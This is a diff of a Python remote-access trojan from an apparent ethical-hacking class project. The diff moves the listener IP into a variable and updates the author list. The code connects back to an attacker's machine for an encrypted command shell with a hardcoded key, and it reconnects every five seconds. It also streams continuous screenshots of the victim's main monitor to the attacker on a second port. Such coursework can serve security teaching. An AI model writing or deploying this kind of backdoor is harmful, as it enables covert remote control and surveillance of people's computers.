@@ -1,7 +1,7 @@
-################################################
-# Authors: Korn D., Krittanut Y.,              #
-# Class: SIIT Ethical Hacking, 2023-2024       #
-################################################
+#################################################################################################
+# Authors: Korn D., Krittanut Y., Sirapat T., Sarun P., Norraset S., Thanapat S., Siwanon T.    #
+# Class: SIIT Ethical Hacking, 2023-2024                                                        #
+#################################################################################################
 
 # Import necessary Python modules
 import socket  # For network communication
@@ -19,6 +19,8 @@ import base64  # For encoding and decoding data in base64 format
 import io # For treating image bytes like a file in memory
 from PIL import Image # To convert raw RGB data to JPEG for compression
 
+# connection variables
+lip = "192.168.210.1" # Listener IP address
 # Pre-shared key for encryption
 psk_aes = b'-SDf80BDeTTeY7jFiydQshGVwpufGx4S9J2sANAJWrI=' # Hardcoded cuz I couldn't careless :P
 cipher = Fernet(psk_aes)  # Create a Fernet cipher object for encryption
@@ -54,7 +56,7 @@ def connection():
         time.sleep(5)  # Wait for 5 seconds before reconnecting (for resilience)
         try:
             # Connect to a remote host with Listener IP and port 5555
-            s.connect(('192.168.210.1', 5555))
+            s.connect((lip, 5555))
             # Once connected, enter the shell() function for command execution
             shell()
             # Close the connection when done
@@ -172,7 +174,7 @@ def take_screenshot():
 def stream_screen():
     try: # Runs in a separate thread and continuously sends screenshots to the server
         stream_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Create a TCP socket.
-        stream_socket.connect(('192.168.210.1', 9999)) # Connect to the attacker's machine on port 9999 for streaming.
+        stream_socket.connect((lip, 9999)) # Connect to the attacker's machine on port 9999 for streaming.
         with mss.mss() as sct: # Open a screen capture session using mss
             while True: # Loop forever to take screenshots
                 screenshots = sct.grab(sct.monitors[1]) # Take a screenshot of the main monitor.
